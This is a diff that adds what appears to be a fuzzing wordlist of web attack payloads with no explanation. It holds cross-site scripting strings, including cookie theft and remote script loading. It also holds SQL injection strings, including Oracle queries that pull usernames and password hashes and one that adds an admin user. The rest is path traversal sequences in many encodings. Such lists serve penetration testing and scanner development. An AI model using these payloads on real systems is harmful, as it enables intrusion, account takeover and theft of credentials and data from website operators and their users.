@@ -1,0 +1,854 @@
+<script>alert("xss")</script>
+%3e%3c/script%3e%3cscript%3ealert('xssposed')%3c/script%3e
+";alert(1)//
+'-alert(1)-'
+"<script>alert(1)</script>
+%22%3e%3cscript%3ealert%28%27xss%27%29%3c/script%3e
+<script>alert('xss');</script>
+'';!--"<xss>=&{()}
+<script src=http://ha.ckers.org/xss.js></script>
+<img src="javascript:alert('xss');">
+<img src=javascript:alert('xss')>
+"><img src=x onerror=prompt(document.cookie)>
+<h1 onerror=alert(/@0x6d6172696f/)>xss by alex</h1><style>*:after{content:url()}</style>
+"><script>document.location.href="http://www.google.com"</script> 
+‚Äù><script>alert(‚Äúx‚Äù)</script>
+‚Äô><script>alert(1)</script>
+"><script>alert(1)</script>
+"><script> alert(1)     </   script>
+'><script>alert(1)</script>
+'><script>alert(1)</script>
+' '><script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+" onerror=alert(1) "
+" onerror=alert(1) x="
+-alert(1)-
+-prompt(1)-
+<marquee/onstart=confirm(1)>
+"><marquee/onstart=confirm(1)>
+'><marquee/onstart=confirm(1)>
+<img src=x onerror=prompt(1);> 
+"><img src=x onerror=prompt(1);> 
+'><img src=x onerror=prompt(1);> 
+<img src=x onerror=prompt(1)>
+"><img src=x onerror=prompt(1)>
+'><img src=x onerror=prompt(1)>
+'';!--"<x>=&{()}
+<script>+alert("x");</script>
+"><script>+alert("x");</script>
+'><script>+alert("x");</script>
+<script>+alert("x")</script>
+"><script>+alert("x")</script>
+%22+or+isnull%281%2f0%29+%2f*
+%27+or+%277659%27%3d%277659
+%22+or+isnull%281%2f0%29+%2f*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+admin' or '
+'%20select%20*%20from%20information_schema.tables--
+) union select%20*%20from%20information_schema.tables;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' or 'unusual' = 'unusual'
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'something' like 'some%'
+' or 2 > 1
+' || myappadmin.adduser('admin', 'newpass') || '
+' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i
+<img src=&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<img src="javÔªø  ascript:alert('xss');">
+<img src="jav&#x09;ascript:alert('xss');">
+<img src="jav&#x0a;ascript:alert('xss');">
+<img src="jav&#x0d;ascript:alert('xss');">
+<img src=" &#14;  javascript:alert('xss');">
+<img%0asrc%0a=%0a"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0ax%0as%0as%0a'%0a)%0a"%0a>
+<img src=java%00script:alert(\"xss\")>
+<scr%00ipt>alert(\"xss\")</scr%00ipt>
+<script/xss src="http://ha.ckers.org/xss.js"></script>
+<script src=http://ha.ckers.org/xss.js?<b>
+<img src="javascript:alert('xss')"
+<script>a=/xss/
+\";alert('xss');//
+<input type="image" src="javascript:alert('xss');">
+<body background="javascript:alert('xss')">
+<body onload=alert('xss')>
+<img dynsrc="javascript:alert('xss')">
+<frameset><frame src="javascript:alert('xss');"></frameset>
+<table background="javascript:alert('xss')">
+<div style="background-image: url(javascript:alert('xss'))">
+<div style="background-image: url(&#1;javascript:alert('xss'))">
+<div style="width: expression(alert('xss'));">
+<style>@im\port'\ja\vasc\ript:alert("xss")';</style>
+<img style="xss:expr/*xss*/ession(alert('xss'))">
+<xss style="xss:expression(alert('xss'))">
+exp/*<xss style='no\xss:noxss("*//*");
+<style type="text/javascript">alert('xss');</style>
+<style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>
+/../../../../../{file}
+/../../../../../../{file}
+/../../../../../../../{file}
+/../../../../../../../../{file}
+/..%2f{file}
+/..%2f..%2f{file}
+/..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}
+/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{file}
+/%2e%2e/{file}
+/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}
+/%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}
+/..%252f{file}
+/..%252f..%252f{file}
+/..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f{file}
+/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{file}
+/%252e%252e/{file}
+/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{file}
+/%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}
+/..%255c{file}
+/..%255c..%255c{file}
+/..%255c..%255c..%255c{file}
+/..%255c..%255c..%255c..%255c{file}
+/..%255c..%255c..%255c..%255c..%255c{file}
+/..%255c..%255c..%255c..%255c..%255c..%255c{file}
+/..%255c..%255c..%255c..%255c..%255c..%255c..%255c{file}
+/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{file}
+/..%5c..%5c{file}
+/..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c{file}
+/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{file}
+/%2e%2e\{file}
+/%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{file}
+/%2e%2e%5c{file}
+/%252e%252e\{file}
+/%252e%252e\%252e%252e\{file}
+/%252e%252e\%252e%252e\%252e%252e\{file}
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\{file}
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{file}
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{file}
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{file}
+/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{file}
+/%252e%252e%255c{file}
+' and 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select sys.login_user from dual)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select sys.database_name from dual)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select host_name from v$instance)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select global_name from global_name)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(username)) from sys.all_users)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(password)) from sys.user$)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(table_name)) from sys.all_tables)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(column_name)) from sys.all_tab_columns)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select count(distinct(granted_role)) from dba_role_privs where grantee=sys.login_user)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=1)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=1)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=1)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=1)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=1)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=2)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=2)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=2)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i
+' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i
+/%252e%252e%255c%252e%252e%255c{file}
+/%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}
+/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{file}
+/..%c0%af{file}
+/..%c0%af..%c0%af{file}
+/..%c0%af..%c0%af..%c0%af{file}
+/..%c0%af..%c0%af..%c0%af..%c0%af{file}
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}
+/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}
+/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{file}
+/%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}
+/..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{file}
+/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{file}
+/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{file}
+/%25c0%25ae%25c0%25ae%25c0%25af{file}
+/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{file}
+/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{file}
+/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{file}
+/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{file}
+/..%c1%9c{file}
+/..%c1%9c..%c1%9c{file}
+/..%c1%9c..%c1%9c..%c1%9c{file}
+/..%c1%9c..%c1%9c..%c1%9c..%c1%9c{file}
+/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{file}
+/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{file}
+/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{file}
+/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{file}
+/%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{file}
+/%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{file}
+/..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{file}
+/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{file}
+/%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{file}
+/%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{file}
+/..%%32%66{file}
+/..%%32%66..%%32%66{file}
+/..%%32%66..%%32%66..%%32%66{file}
+/..%%32%66..%%32%66..%%32%66..%%32%66{file}
+/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{file}
+/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{file}
+/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{file}
+/..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{file}
+/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/{file}
+/..%%35%63..%%35%63{file}
+/..%%35%63..%%35%63..%%35%63{file}
+/..%%35%63..%%35%63..%%35%63..%%35%63{file}
+/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{file}
+/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{file}
+/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{file}
+/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{file}
+/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{file}
+/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{file}
